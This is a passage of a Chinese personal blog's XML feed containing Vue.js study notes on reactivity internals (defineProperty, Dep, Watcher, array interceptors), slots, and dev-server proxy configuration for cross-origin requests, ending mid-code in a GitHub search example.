&#123; id: nanoid(), name: response.data &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        error =&gt; &#123; </span><br><span class="line">            alert(error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在收到正确的回调之后再发送commit</p><p>注意我们这里不需要Person组件中传递参数，所以只能写成常规形式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addPersonServer()&#123;//不能用mapActions,因为mapActions中必须传参&#123;&#x27;addPersonServer&#x27;:xxx&#125;</span><br><span class="line">    this.$store.dispatch(&#x27;personOption/addPersonServer&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就得到了一个与后端交互的vuex</p>]]></content>
    
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Vue.js 学习心得</title>
    <link href="/2022/05/12/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAVue.js%E3%80%8B%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"/>
    <url>/2022/05/12/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAVue.js%E3%80%8B%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="《深入浅出Vue-js》学习心得"><a href="#《深入浅出Vue-js》学习心得" class="headerlink" title="《深入浅出Vue.js》学习心得"></a>《深入浅出Vue.js》学习心得</h1><p>简介：CSDN和知乎上搜索学习资料的时候被推荐的这本书，里面主要是关于Vue源码的介绍，很细，富有引导性的一步一步解释Vue的源码和特殊之处。</p><h2 id="Chapter-1–变化侦测"><a href="#Chapter-1–变化侦测" class="headerlink" title="Chapter 1–变化侦测"></a>Chapter 1–变化侦测</h2><p>首先我们说说变化侦测是什么，简单来说变化侦测就是确定我们的应用发生了什么变化，而Vue的变化侦测的粒度属于中粒度-组件层面大小。变化侦测到之后我们进行虚拟DOM的比对，来重新渲染页面等等。</p><p>其实这个部分是分为了两节讲解的，分别是object和array，变化侦测在这两个对象上有所不同</p><h3 id="1-object变化侦测"><a href="#1-object变化侦测" class="headerlink" title="1. object变化侦测"></a>1. object变化侦测</h3><p>js所提供的object变化侦测的方法有两种，一种是<code>Object.defineProperty</code>，一种是ES6提供的<code>proxy</code>。而我们的Vue所使用的的便是<code>Object.defineProperty</code>。如果我们是Vue的开发者，我们现在就需要对这个函数进行加工封装，从而实现我们需要的响应式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function defineReactive (data, key, val) &#123;//封装函数</span><br><span class="line">    Object.defineProperty(data, key, &#123;//配置defineProperty</span><br><span class="line">        enumerable: true,//自带配置，是否能通过for遍历循环</span><br><span class="line">        configurable: true,//自带配置，是否可以更改属性</span><br><span class="line">        get: function () &#123;</span><br><span class="line">            return val</span><br><span class="line">        &#125;,</span><br><span class="line">        set: function (newVal) &#123;</span><br><span class="line">            if(val === newVal)&#123;</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">            val = newVal</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的set函数，首先判断了新值和旧值是否一样，不一样的情况下才进行重新赋值操作。</p><h4 id="收集依赖"><a href="#收集依赖" class="headerlink" title="收集依赖"></a>收集依赖</h4><p>现在我们要做的是添砖加瓦，第一件事情是 收集依赖 ，我们在get中收集依赖，在set中触发依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">data:&#123;</span><br><span class="line">name:&#x27;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如这样的代码，程序中可能有很多地方使用到了name，<strong>收集依赖便是确定那些地方用法到了name</strong>。如果name改变我们需要通知所有用到name的地方name发生了改变，<strong>触发依赖便是将值的改变进行通知</strong></p><p>我们使用一个dep数组进行收集</p><p>我们需要在get中增加收集=&gt;<code>dep.push(window.target)</code>这里的<code>window.target</code>便是触发get的对象，也就是使用到name的地方</p><p>然后在set中触发收集到的依赖=&gt;使用一个遍历将dep中的value全部变化为newValue，这样我们便完成了触发依赖</p><p>我们还应该将我们的dep写成一个类，解耦而且可以更好的帮我们管理依赖。</p><h4 id="Watcher"><a href="#Watcher" class="headerlink" title="Watcher"></a>Watcher</h4><p>现在为了加快我们依赖触发的效率和通用性，我们将所有收集到的<code>window.target</code>转化成一个Watcher类，当我们需要通知变化的时候就可以给Watcher发送消息。Watcher就类似于一个中介。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Watch &#123;</span><br><span class="line">    constructor (expOrFn, cb) &#123;</span><br><span class="line">        // 执行 this.getter() 就可以拿到 data.a.b.c</span><br><span class="line">        this.getter = parsePath(expOrFn)//触发getter读取数据，将this加入dep</span><br><span class="line">        this.cb = cb</span><br><span class="line">        this.value = this.get()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get () &#123;</span><br><span class="line">        Dep.target = this//将this也就是Watcher赋给当前的target实现一个转换</span><br><span class="line">        value = this.getter.call(vm, vm)</span><br><span class="line">        Dep.target = undefined</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update () &#123;//data.a.b.c的值发生变化后触发，更新数据</span><br><span class="line">        const oldValue = this.value</span><br><span class="line">        this.value = this.get()</span><br><span class="line">        this.cb.call(this.vm, this.value, oldValue)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="深入侦测"><a href="#深入侦测" class="headerlink" title="深入侦测"></a>深入侦测</h4><p>现在我们需要侦测这个属性的子属性（有点类似于深度监视）。我们加入一个递归侦测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function walk (obj: Object) &#123;</span><br><span class="line">  const keys = Object.keys(obj)</span><br><span class="line">  for (let i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">    defineReactive(obj, keys[i], obj[keys[i]])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用walk将这个对象的下一级转换为响应式的数据，在触发<code>defineReactive</code>的时候，再调用一次walk，如果此时的数据的object，那么就会再把下一级进行转换。就这样套娃直到下一次不再是对象，代表我们已经将所有子数据转换成响应式了。</p><p>关于<code>defineReactive()</code>函数，其实是用于将set改变后的数据传给get，形成数据的响应式。</p><p>源码是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//自定义defineReactive函数</span><br><span class="line">function defineReactive(data, key, val) &#123;</span><br><span class="line">    Object.defineProperty(data, key, &#123;</span><br><span class="line">        //可枚举</span><br><span class="line">        enumerable: true,</span><br><span class="line">        //可以被delete</span><br><span class="line">        configurable: true,</span><br><span class="line">        //getter：数据劫持</span><br><span class="line">        get() &#123;</span><br><span class="line">            console.log(&quot;正在访问&quot; + key + &quot;属性&quot;);</span><br><span class="line">            return val;</span><br><span class="line">        &#125;,</span><br><span class="line">        //setter</span><br><span class="line">        set(newValue) &#123;</span><br><span class="line">            console.log(&quot;正在改变&quot; + key + &quot;属性&quot;, newValue)</span><br><span class="line">            if (val !== newValue) &#123;</span><br><span class="line">               val = newValue</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">defineReactive(obj, &#x27;c&#x27;, 10)</span><br><span class="line">console.log(obj.c);//10</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>set触发之后val的值就和newValue一致了，调用get函数的时候获取到的值就是set更新之后的值了。</p><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>但是我们的代码依然有漏洞，在新增数据或者删除数据的时候，我们依然无法收到通知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 新增</span><br><span class="line">function walk (obj: Object) &#123;</span><br><span class="line">  const keys = Object.keys(obj)</span><br><span class="line">  for (let i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">    defineReactive(obj, keys[i], obj[keys[i]])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function defineReactive (data, key, val) &#123;</span><br><span class="line">    walk(val) // 新增</span><br><span class="line">    let dep = new Dep()</span><br><span class="line">    Object.defineProperty(data, key, &#123;</span><br><span class="line">        enumerable: true,</span><br><span class="line">        configurable: true,</span><br><span class="line">        get: function () &#123;</span><br><span class="line">            dep.depend()</span><br><span class="line">            return val</span><br><span class="line">        &#125;,</span><br><span class="line">        set: function (newVal) &#123;</span><br><span class="line">            if(val === newVal)&#123;</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dep.notify()</span><br><span class="line">            val = newVal</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-array变化侦测"><a href="#2-array变化侦测" class="headerlink" title="2.array变化侦测"></a>2.array变化侦测</h3><p>array变化侦测是使用一个拦截器覆盖了<code>Array.prototype</code>，操作数组的时候就会触发这个拦截器</p><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>拦截器代码</p><p>创建arrayProto，后面会使用arrayProto去覆盖Array.prototype</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const arrayProto = Array.prototype</span><br><span class="line">export const arrayMethods = Object.create(arrayProto)</span><br></pre></td></tr></table></figure><p>对数组方法调用forEach，每一个都做一个defineProperty，接收几个参数设置forEach遍历得到的<code>method</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">;[</span><br><span class="line">  &#x27;push&#x27;,</span><br><span class="line">  &#x27;pop&#x27;,</span><br><span class="line">  &#x27;shift&#x27;,</span><br><span class="line">  &#x27;unshift&#x27;,</span><br><span class="line">  &#x27;splice&#x27;,</span><br><span class="line">  &#x27;sort&#x27;,</span><br><span class="line">  &#x27;reverse&#x27;</span><br><span class="line">]</span><br><span class="line">.forEach(function (method) &#123;</span><br><span class="line">  // cache original method</span><br><span class="line">  const original = arrayProto[method]</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(arrayMethods, method, &#123;</span><br><span class="line">    value: function mutator (...args) &#123;</span><br><span class="line">      console.log(method) // 打印数组方法</span><br><span class="line">      return original.apply(this, args)</span><br><span class="line">    &#125;,</span><br><span class="line">    enumerable: false,</span><br><span class="line">    writable: true,</span><br><span class="line">    configurable: true</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用拦截器覆盖array原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">export class Observer &#123;</span><br><span class="line">  constructor (value: any) &#123;</span><br><span class="line">    this.value = value</span><br><span class="line">    this.dep = new Dep()</span><br><span class="line">    this.vmCount = 0</span><br><span class="line">    def(value, &#x27;__ob__&#x27;, this)</span><br><span class="line"></span><br><span class="line">    if (Array.isArray(value)) &#123;</span><br><span class="line">      value.__proto__ = arrayMethods // 新增</span><br><span class="line">      this.observeArray(value)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      this.walk(value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>插槽</title>
    <link href="/2022/05/12/%E6%8F%92%E6%A7%BD/"/>
    <url>/2022/05/12/%E6%8F%92%E6%A7%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h1><p>我们现在需求三个列表，包含三部分内容</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\插槽\产品样例.png" alt="产品样例"></p><p>构造Category组件，但是由于我们页面是对Category组件的复用，所以我们难以得到三个很大区别的列表，我们需要列表自己选择准备填入的数据。</p><p>tips：可以说插槽就是组件间通信的一种</p><h2 id="1-默认插槽"><a href="#1-默认插槽" class="headerlink" title="1.默认插槽"></a>1.默认插槽</h2><p>最简单的插槽</p><p>使用插槽的第一步：将组件标签改写为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Category title=&quot;美食&quot;&gt;</span><br><span class="line">      &lt;!-- 加入准备填入的内容 --&gt;</span><br><span class="line">      &lt;img src=&quot;https://s3.ax1x.com/2021/01/16/srJlq0.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/Category&gt;</span><br></pre></td></tr></table></figure><p>在组价标签中加入准备传入的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;category&quot;&gt;</span><br><span class="line">      &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt;</span><br><span class="line">      &lt;!-- 默认插槽 --&gt;</span><br><span class="line">      &lt;slot&gt;没有数据传入的时候显示我&lt;/slot&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>slot会根据上一段代码中，组件标签中的数据，将其放入列表中的对应位置</p><p>但是，这种方式的缺点便是，只能将填入的数据一股脑的放入到一个slot中，不够灵活。</p><h2 id="2-具名插槽"><a href="#2-具名插槽" class="headerlink" title="2.具名插槽"></a>2.具名插槽</h2><p>顾名思义，具名插槽就是有name属性的插槽</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;category&quot;&gt;</span><br><span class="line">      &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt;</span><br><span class="line">      &lt;!-- 默认插槽 --&gt;</span><br><span class="line">      &lt;slot name=&quot;center&quot;&gt;没有数据传入的时候显示我&lt;/slot&gt;</span><br><span class="line">      &lt;slot name=&quot;footer&quot;&gt;没有数据传入的时候显示我&lt;/slot&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>在slot属性中加入name属性以区分不同的插槽</p><p>而我们的数据部分也应该署名自己属于那个插槽</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Category title=&quot;美食&quot;&gt;</span><br><span class="line">      &lt;!-- 加入准备填入的内容 --&gt;</span><br><span class="line">      &lt;img slot=&#x27;center&#x27; src=&quot;https://s3.ax1x.com/2021/01/16/srJlq0.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">      &lt;a slot=&#x27;footer&#x27; href=&quot;https://tspigeon.github.io&quot;&gt;更多美食&lt;/a&gt;</span><br><span class="line">&lt;/Category&gt;</span><br></pre></td></tr></table></figure><p>特别的如果我们的数据包含多个标签，可以使用div或者template包裹起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div slot=&quot;footer&quot;&gt;//如果使用&lt;template&gt;那么我们可以把slot写成&lt;template v-slot:footer&gt;</span><br><span class="line">      &lt;a href=&quot;https://tspigeon.github.io&quot;&gt;单机游戏&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;https://tspigeon.github.io&quot;&gt;网页游戏&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="3-作用域插槽"><a href="#3-作用域插槽" class="headerlink" title="3.作用域插槽"></a>3.作用域插槽</h2><p>作用域插槽适用于数据和结构分离的插槽</p><p>因为数据和结构不再一个组件当中–（数据在Category中，结构在app中），所以我们使用作用域插槽</p><p>首先使用作用域插槽传输数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//Category组件中包含数据和插槽</span><br><span class="line">&lt;div class=&quot;category&quot;&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt;</span><br><span class="line">    &lt;slot :games=&#x27;games&#x27;&gt;没有数据传入的时候显示我&lt;/slot&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>然后在app组件中接收数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Category title=&quot;游戏&quot;&gt;</span><br><span class="line">  &lt;!-- 这里必须使用template包裹并写上scope或者slot-scope --&gt;</span><br><span class="line">  &lt;template slot-scope=&quot;item&quot;&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">  &lt;li v-for=&quot;(g,index) in item.games&quot; :key=&#x27;index&#x27;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/Category&gt;</span><br></pre></td></tr></table></figure><p>scope接收的名字可以与发送的名字不一样=&gt;（比如这里发送的时候是game，接收是Item，有点类似于函数的变量接收）</p><p>这样插槽形式适用于:根据数据生成的结构是由使用者（这里是我们的app）决定的</p><p>同时作用域插槽也可以有名字，加入一个name属性和slot属性即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置代理</title>
    <link href="/2022/05/03/%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2022/05/03/%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h1><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>我们在使用Ajax的axios方式发送请求的时候，时常会出现跨域问题（违反同源策略，也就是我们这里的端口号不同，8080向5000发了请求）</p><p><img src="https://s2.loli.net/2022/05/03/JH1OdeZtEY8zFcA.png" alt="配置跨域报错.png"></p><p>而我们现在就学习如何通过vue解决跨域问题</p><h2 id="方式1："><a href="#方式1：" class="headerlink" title="方式1："></a>方式1：</h2><p>其实我们处理这个问题的方法有很多 ，在我们学习Ajax的时候就会经常使用，比如Nginx就是后端人员帮助我们配置代理的一个方法。但是对于我们的vue来说，<strong>我们使用的是 建立一个代理服务器（开在相同的端口-8080），通过代理服务器向5000端口服务器发请求。</strong></p><p>对应的参考在：vue官网-cli-配置参考-devServer.proxy</p><h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a>具体实现：</h3><p>我们打开vue.config.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module.exports = defineConfig(&#123;</span><br><span class="line">  lintOnSave:false,  //关闭语法检查</span><br><span class="line">  //开启代理服务器</span><br><span class="line">  devServer:&#123;</span><br><span class="line">    proxy:&#x27;http://localhost:5000&#x27;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样我们就在8080端口开启了一个代理服务器</p><p>对应的前端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getStudent()&#123;</span><br><span class="line">      axios.get(&#x27;http://localhost:8080/students&#x27;).then(//8080代理服务器，把请求转发给5000，所以我们这里找8080要数据</span><br><span class="line">        response =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求成功了&#x27;,response.data);//获取成果的数据需要.data</span><br><span class="line">        &#125;,</span><br><span class="line">        error =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求失败了&#x27;,error.message);//获取失败的信息，具体需要加message</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p>第一：如果请求的资源在8080代理有重名的，也就是我们的public文件夹当中，那么就不会向5000发送请求，会直接返回public中的数据，而当然就是错误的数据。</p><p>第二：我们配置代理的时候只能配置一个 proxy，也就代表着我们的代理服务器只能向一个源服务器发送请求。</p><h2 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h2><p>方式二会比方式一复杂一点，但是就解决了我们上面提到的两个问题</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>首先还是参照官方文档将devServer的具体形式写入config.js:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      //第一个代理服务器</span><br><span class="line">      &#x27;/api&#x27;: &#123;//只要请求前缀是/api就触发</span><br><span class="line">        target: &#x27;http://localhost:5000&#x27;,</span><br><span class="line">        pathRewrite:&#123;&#x27;^/api&#x27;:&#x27;&#x27;&#125;,//正则表达式将代/api的都换成&#x27;&#x27;空串</span><br><span class="line">        ws: true,//用于支持websocket</span><br><span class="line">        changeOrigin: true//申请的时候改变自己的端口号为5000(host中)</span><br><span class="line">      &#125;,</span><br><span class="line">      //第二个代理服务器</span><br><span class="line">      &#x27;/foo&#x27;: &#123;</span><br><span class="line">        target:  &#x27;http://localhost:5001&#x27;,</span><br><span class="line">        pathRewrite:&#123;&#x27;^/foo&#x27;:&#x27;&#x27;&#125;,</span><br><span class="line">        ws:true,</span><br><span class="line">        changeOrigin:true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意我们这里的pathRewrite，重写我们的请求路径</p><p>前端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//获取学生信息</span><br><span class="line">axios.get(&#x27;http://localhost:8080/api/students&#x27;).then(//注意这样会将/api/students也带给服务器--会导致报错</span><br><span class="line">        response =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求成功了&#x27;,response.data);//获取成果的数据需要.data</span><br><span class="line">        &#125;,</span><br><span class="line">        error =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求失败了&#x27;,error.message);//获取失败的信息，具体需要加message</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">//获取汽车信息</span><br><span class="line">axios.get(&#x27;http://localhost:8080/foo/cars&#x27;).then(//注意这样会将/api/students也带给服务器--会导致报错</span><br><span class="line">        response =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求成功了&#x27;,response.data);//获取成果的数据需要.data</span><br><span class="line">        &#125;,</span><br><span class="line">        error =&gt; &#123;</span><br><span class="line">          console.log(&#x27;请求失败了&#x27;,error.message);//获取失败的信息，具体需要加message</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p>我们需要走代理的时候就加上代理前缀：比如<code>/api/students</code></p><h2 id="GitHub搜索实例"><a href="#GitHub搜索实例" class="headerlink" title="GitHub搜索实例"></a>GitHub搜索实例</h2><p>我们现在要求一个搜索页面，能够搜索GitHub上面的用户：</p><p><img src="https://s2.loli.net/2022/05/03/Hr365bxANE7theT.png" alt="GitHub案例.png"></p><p>上面的搜索框我们在Search组件中实现，下面的显示我们在List组件中实现。</p><p>对于具体的样式和html部分不再赘述。</p><h3 id="首先看Search的搜索框部分："><a href="#首先看Search的搜索框部分：" class="headerlink" title="首先看Search的搜索框部分："></a>首先看Search的搜索框部分：</h3><p>首先需要双向绑定一个keyWord，用于记录我们的搜索值</p><p>需要给GitHub发送请求，GitHub中有一个专门的搜索网址：<a href="https://api.github.com/search/users?q=xxx">https://api.github.com/search/users?q=xxx</a>，我们利用ajax发送请求。</p><p>将收到的数据返还给List组件，这里需要用到全局事件总线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 